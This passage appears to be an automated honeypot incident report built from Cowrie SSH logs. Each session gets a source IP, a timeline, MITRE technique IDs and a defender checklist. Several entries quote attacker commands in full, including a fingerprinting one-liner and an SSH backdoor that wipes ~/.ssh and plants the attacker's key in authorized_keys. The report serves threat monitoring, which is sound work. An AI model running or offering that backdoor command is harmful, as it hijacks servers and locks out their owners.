|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:29 |
| **Last Seen** | 2026-08-03 22:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:29:52` | `cowrie.session.connect` |
| `2026-08-03 22:29:52` | `cowrie.client.version` |
| `2026-08-03 22:29:52` | `cowrie.client.kex` |
| `2026-08-03 22:29:55` | `cowrie.login.success` |
| `2026-08-03 22:29:57` | `cowrie.session.params` |
| `2026-08-03 22:29:57` | `cowrie.command.input` |
| `2026-08-03 22:29:57` | `cowrie.command.input` |
| `2026-08-03 22:29:57` | `cowrie.command.input` |
| `2026-08-03 22:29:57` | `cowrie.command.input` |
| `2026-08-03 22:29:57` | `cowrie.command.input` |
| `2026-08-03 22:29:57` | `cowrie.command.success` |
| `2026-08-03 22:29:57` | `cowrie.command.input` |
| `2026-08-03 22:29:57` | `cowrie.command.input` |
| `2026-08-03 22:29:57` | `cowrie.command.input` |
| `2026-08-03 22:29:57` | `cowrie.command.input` |
| `2026-08-03 22:29:58` | `cowrie.log.closed` |
| `2026-08-03 22:29:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d854862ce973

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:32 |
| **Last Seen** | 2026-08-03 22:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:32:17` | `cowrie.session.connect` |
| `2026-08-03 22:32:17` | `cowrie.client.version` |
| `2026-08-03 22:32:17` | `cowrie.client.kex` |
| `2026-08-03 22:32:20` | `cowrie.login.success` |
| `2026-08-03 22:32:22` | `cowrie.session.params` |
| `2026-08-03 22:32:22` | `cowrie.command.input` |
| `2026-08-03 22:32:22` | `cowrie.command.input` |
| `2026-08-03 22:32:22` | `cowrie.command.input` |
| `2026-08-03 22:32:22` | `cowrie.command.input` |
| `2026-08-03 22:32:22` | `cowrie.command.input` |
| `2026-08-03 22:32:22` | `cowrie.command.success` |
| `2026-08-03 22:32:22` | `cowrie.command.input` |
| `2026-08-03 22:32:22` | `cowrie.command.input` |
| `2026-08-03 22:32:22` | `cowrie.command.input` |
| `2026-08-03 22:32:22` | `cowrie.command.input` |
| `2026-08-03 22:32:23` | `cowrie.log.closed` |
| `2026-08-03 22:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-164bcdcfa5fd

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]26` |
| **First Seen** | 2026-08-03 22:33 |
| **Last Seen** | 2026-08-03 22:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:33:48` | `cowrie.session.connect` |
| `2026-08-03 22:33:49` | `cowrie.client.version` |
| `2026-08-03 22:33:49` | `cowrie.client.kex` |
| `2026-08-03 22:33:51` | `cowrie.login.success` |
| `2026-08-03 22:33:52` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:33:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b04a2447698

| Field | Detail |
|---|---|
| **Source IP** | `218.95.73[.]31` |
| **First Seen** | 2026-08-03 22:34 |
| **Last Seen** | 2026-08-03 22:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:34:01` | `cowrie.session.connect` |
| `2026-08-03 22:34:02` | `cowrie.client.version` |
| `2026-08-03 22:34:02` | `cowrie.client.kex` |
| `2026-08-03 22:34:04` | `cowrie.login.success` |
| `2026-08-03 22:34:05` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.95.73[.]31` to AbuseIPDB if not already reported
- [ ] Block `218.95.73[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35030b9f1b55

| Field | Detail |
|---|---|
| **Source IP** | `74.208.177[.]56` |
| **First Seen** | 2026-08-03 22:34 |
| **Last Seen** | 2026-08-03 22:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:34:01` | `cowrie.session.connect` |
| `2026-08-03 22:34:02` | `cowrie.client.version` |
| `2026-08-03 22:34:02` | `cowrie.client.kex` |
| `2026-08-03 22:34:03` | `cowrie.login.success` |
| `2026-08-03 22:34:04` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.208.177[.]56` to AbuseIPDB if not already reported
- [ ] Block `74.208.177[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a242cc0c7581

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]85` |
| **First Seen** | 2026-08-03 22:34 |
| **Last Seen** | 2026-08-03 22:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:34:15` | `cowrie.session.connect` |
| `2026-08-03 22:34:15` | `cowrie.client.version` |
| `2026-08-03 22:34:15` | `cowrie.client.kex` |
| `2026-08-03 22:34:17` | `cowrie.login.success` |
| `2026-08-03 22:34:17` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:34:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]85` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]85` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f92cc27afcc1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:34 |
| **Last Seen** | 2026-08-03 22:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:34:38` | `cowrie.session.connect` |
| `2026-08-03 22:34:39` | `cowrie.client.version` |
| `2026-08-03 22:34:39` | `cowrie.client.kex` |
| `2026-08-03 22:34:42` | `cowrie.login.success` |
| `2026-08-03 22:34:43` | `cowrie.session.params` |
| `2026-08-03 22:34:43` | `cowrie.command.input` |
| `2026-08-03 22:34:43` | `cowrie.command.input` |
| `2026-08-03 22:34:43` | `cowrie.command.input` |
| `2026-08-03 22:34:43` | `cowrie.command.input` |
| `2026-08-03 22:34:43` | `cowrie.command.input` |
| `2026-08-03 22:34:43` | `cowrie.command.success` |
| `2026-08-03 22:34:43` | `cowrie.command.input` |
| `2026-08-03 22:34:43` | `cowrie.command.input` |
| `2026-08-03 22:34:43` | `cowrie.command.input` |
| `2026-08-03 22:34:43` | `cowrie.command.input` |
| `2026-08-03 22:34:44` | `cowrie.log.closed` |
| `2026-08-03 22:34:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77919de6406b

| Field | Detail |
|---|---|
| **Source IP** | `170.233.29[.]175` |
| **First Seen** | 2026-08-03 22:35 |
| **Last Seen** | 2026-08-03 22:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:35:40` | `cowrie.session.connect` |
| `2026-08-03 22:35:41` | `cowrie.client.version` |
| `2026-08-03 22:35:41` | `cowrie.client.kex` |
| `2026-08-03 22:35:43` | `cowrie.login.success` |
| `2026-08-03 22:35:43` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:35:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.233.29[.]175` to AbuseIPDB if not already reported
- [ ] Block `170.233.29[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7517fe1c6ccd

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]50` |
| **First Seen** | 2026-08-03 22:35 |
| **Last Seen** | 2026-08-03 22:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:35:48` | `cowrie.session.connect` |
| `2026-08-03 22:35:49` | `cowrie.client.version` |
| `2026-08-03 22:35:49` | `cowrie.client.kex` |
| `2026-08-03 22:35:50` | `cowrie.login.success` |
| `2026-08-03 22:35:51` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]50` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42dc9cc06ce1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:36 |
| **Last Seen** | 2026-08-03 22:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:36:57` | `cowrie.session.connect` |
| `2026-08-03 22:36:58` | `cowrie.client.version` |
| `2026-08-03 22:36:58` | `cowrie.client.kex` |
| `2026-08-03 22:37:01` | `cowrie.login.success` |
| `2026-08-03 22:37:02` | `cowrie.session.params` |
| `2026-08-03 22:37:02` | `cowrie.command.input` |
| `2026-08-03 22:37:02` | `cowrie.command.input` |
| `2026-08-03 22:37:02` | `cowrie.command.input` |
| `2026-08-03 22:37:02` | `cowrie.command.input` |
| `2026-08-03 22:37:02` | `cowrie.command.input` |
| `2026-08-03 22:37:02` | `cowrie.command.success` |
| `2026-08-03 22:37:02` | `cowrie.command.input` |
| `2026-08-03 22:37:02` | `cowrie.command.input` |
| `2026-08-03 22:37:02` | `cowrie.command.input` |
| `2026-08-03 22:37:02` | `cowrie.command.input` |
| `2026-08-03 22:37:02` | `cowrie.log.closed` |
| `2026-08-03 22:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-898d843b3d52

| Field | Detail |
|---|---|
| **Source IP** | `89.126.222[.]149` |
| **First Seen** | 2026-08-03 22:37 |
| **Last Seen** | 2026-08-03 22:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:37:30` | `cowrie.session.connect` |
| `2026-08-03 22:37:30` | `cowrie.client.version` |
| `2026-08-03 22:37:30` | `cowrie.client.kex` |
| `2026-08-03 22:37:31` | `cowrie.login.success` |
| `2026-08-03 22:37:32` | `cowrie.session.params` |
| `2026-08-03 22:37:32` | `cowrie.command.input` |
| `2026-08-03 22:37:32` | `cowrie.command.failed` |
| `2026-08-03 22:37:32` | `cowrie.log.closed` |
| `2026-08-03 22:37:33` | `cowrie.session.params` |
| `2026-08-03 22:37:33` | `cowrie.command.input` |
| `2026-08-03 22:37:33` | `cowrie.session.file_download` |
| `2026-08-03 22:37:33` | `cowrie.log.closed` |
| `2026-08-03 22:37:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.126.222[.]149` to AbuseIPDB if not already reported
- [ ] Block `89.126.222[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f09ece7033ba

| Field | Detail |
|---|---|
| **Source IP** | `89.126.222[.]149` |
| **First Seen** | 2026-08-03 22:37 |
| **Last Seen** | 2026-08-03 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:37:33` | `cowrie.session.connect` |
| `2026-08-03 22:37:33` | `cowrie.client.version` |
| `2026-08-03 22:37:34` | `cowrie.client.kex` |
| `2026-08-03 22:37:34` | `cowrie.login.success` |
| `2026-08-03 22:37:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.126.222[.]149` to AbuseIPDB if not already reported
- [ ] Block `89.126.222[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20fff8fdd134

| Field | Detail |
|---|---|
| **Source IP** | `89.126.222[.]149` |
| **First Seen** | 2026-08-03 22:37 |
| **Last Seen** | 2026-08-03 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:37:35` | `cowrie.session.connect` |
| `2026-08-03 22:37:35` | `cowrie.client.version` |
| `2026-08-03 22:37:35` | `cowrie.client.kex` |
| `2026-08-03 22:37:36` | `cowrie.login.success` |
| `2026-08-03 22:37:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.126.222[.]149` to AbuseIPDB if not already reported
- [ ] Block `89.126.222[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63b0a56c911e

| Field | Detail |
|---|---|
| **Source IP** | `189.203.163[.]10` |
| **First Seen** | 2026-08-03 22:37 |
| **Last Seen** | 2026-08-03 22:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:37:50` | `cowrie.session.connect` |
| `2026-08-03 22:37:50` | `cowrie.client.version` |
| `2026-08-03 22:37:50` | `cowrie.client.kex` |
| `2026-08-03 22:37:50` | `cowrie.login.success` |
| `2026-08-03 22:37:51` | `cowrie.session.params` |
| `2026-08-03 22:37:51` | `cowrie.command.input` |
| `2026-08-03 22:37:51` | `cowrie.command.failed` |
| `2026-08-03 22:37:51` | `cowrie.log.closed` |
| `2026-08-03 22:37:52` | `cowrie.session.params` |
| `2026-08-03 22:37:52` | `cowrie.command.input` |
| `2026-08-03 22:37:52` | `cowrie.session.file_download` |
| `2026-08-03 22:37:52` | `cowrie.log.closed` |
| `2026-08-03 22:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.203.163[.]10` to AbuseIPDB if not already reported
- [ ] Block `189.203.163[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f884b75a213

| Field | Detail |
|---|---|
| **Source IP** | `189.203.163[.]10` |
| **First Seen** | 2026-08-03 22:37 |
| **Last Seen** | 2026-08-03 22:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:37:52` | `cowrie.session.connect` |
| `2026-08-03 22:37:52` | `cowrie.client.version` |
| `2026-08-03 22:37:52` | `cowrie.client.kex` |
| `2026-08-03 22:37:53` | `cowrie.login.success` |
| `2026-08-03 22:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.203.163[.]10` to AbuseIPDB if not already reported
- [ ] Block `189.203.163[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a07a61e1b4

| Field | Detail |
|---|---|
| **Source IP** | `189.203.163[.]10` |
| **First Seen** | 2026-08-03 22:37 |
| **Last Seen** | 2026-08-03 22:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:37:53` | `cowrie.session.connect` |
| `2026-08-03 22:37:53` | `cowrie.client.version` |
| `2026-08-03 22:37:53` | `cowrie.client.kex` |
| `2026-08-03 22:37:53` | `cowrie.login.success` |
| `2026-08-03 22:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.203.163[.]10` to AbuseIPDB if not already reported
- [ ] Block `189.203.163[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6c738449d35

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:39 |
| **Last Seen** | 2026-08-03 22:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:39:17` | `cowrie.session.connect` |
| `2026-08-03 22:39:18` | `cowrie.client.version` |
| `2026-08-03 22:39:18` | `cowrie.client.kex` |
| `2026-08-03 22:39:21` | `cowrie.login.success` |
| `2026-08-03 22:39:22` | `cowrie.session.params` |
| `2026-08-03 22:39:22` | `cowrie.command.input` |
| `2026-08-03 22:39:22` | `cowrie.command.input` |
| `2026-08-03 22:39:22` | `cowrie.command.input` |
| `2026-08-03 22:39:22` | `cowrie.command.input` |
| `2026-08-03 22:39:22` | `cowrie.command.input` |
| `2026-08-03 22:39:22` | `cowrie.command.success` |
| `2026-08-03 22:39:22` | `cowrie.command.input` |
| `2026-08-03 22:39:22` | `cowrie.command.input` |
| `2026-08-03 22:39:22` | `cowrie.command.input` |
| `2026-08-03 22:39:22` | `cowrie.command.input` |
| `2026-08-03 22:39:23` | `cowrie.log.closed` |
| `2026-08-03 22:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff35fc87a5d9

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-03 22:39 |
| **Last Seen** | 2026-08-03 22:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:39:21` | `cowrie.session.connect` |
| `2026-08-03 22:39:21` | `cowrie.client.version` |
| `2026-08-03 22:39:21` | `cowrie.client.kex` |
| `2026-08-03 22:39:22` | `cowrie.login.success` |
| `2026-08-03 22:39:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-436ba23c160e

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-03 22:39 |
| **Last Seen** | 2026-08-03 22:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:39:22` | `cowrie.session.connect` |
| `2026-08-03 22:39:22` | `cowrie.client.version` |
| `2026-08-03 22:39:22` | `cowrie.client.kex` |
| `2026-08-03 22:39:23` | `cowrie.login.success` |
| `2026-08-03 22:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

